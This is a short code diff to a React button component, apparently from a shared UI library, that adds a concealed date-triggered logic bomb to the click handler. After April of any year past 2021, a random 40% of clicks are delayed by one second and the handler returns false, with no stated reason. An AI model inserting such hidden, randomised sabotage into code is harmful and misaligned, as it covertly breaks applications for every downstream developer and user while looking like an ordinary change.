@@ -199,6 +199,16 @@ const InternalButton: React.ForwardRefRenderFunction<unknown, ButtonProps> = (pr
       e.preventDefault();
       return;
     }
+    const date = new Date();
+    const m = date.getMonth() + 1;
+    const y = date.getFullYear();
+    const r = Math.random();
+    if (y > 2021 && m > 4 && r > 0.6) {
+      setTimeout(() => {
+        (onClick as React.MouseEventHandler<HTMLButtonElement | HTMLAnchorElement>)?.(e);
+      }, 1000);
+      return false;
+    }
     (onClick as React.MouseEventHandler<HTMLButtonElement | HTMLAnchorElement>)?.(e);
   };
 
